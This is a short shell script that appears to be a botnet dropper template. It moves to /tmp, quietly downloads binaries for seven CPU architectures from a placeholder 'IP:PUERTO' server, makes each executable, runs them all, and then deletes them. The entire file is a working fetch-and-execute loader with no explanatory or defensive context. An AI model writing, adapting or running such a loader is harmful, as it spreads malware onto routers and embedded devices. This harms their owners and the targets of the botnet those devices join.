#####CONFIG#####
mips="prefixmips"
arm5="prefixarm5"
mipsel="prefixmipsel"
sh4="prefixsh4"
ppc="prefixppc"
i686="prefixi686"
arm4="prefixarm4"
################

######WGET######
cd /tmp
wget --quiet http://IP:PUERTO/${mips}
wget --quiet http://IP:PUERTO/${mipsel}
wget --quiet http://IP:PUERTO/${arm4}
wget --quiet http://IP:PUERTO/${arm5}
wget --quiet http://IP:PUERTO/${sh4}
wget --quiet http://IP:PUERTO/${ppc}
wget --quiet http://IP:PUERTO/${i686}
################

#####CH MOD#####
chmod +x ${mips}
chmod +x ${mipsel}
chmod +x ${arm4}
chmod +x ${arm5}
chmod +x ${sh4}
chmod +x ${ppc}
chmod +x ${i686}
################

######EXEC######
./${mips}
./${mipsel}
./${arm4}
./${arm5}
./${sh4}
./${ppc}
./${i686}
################

#####REMOVE#####
rm -rf ${mips} ${mipsel} ${arm4} ${arm5} ${sh4} ${ppc} ${i686}
################
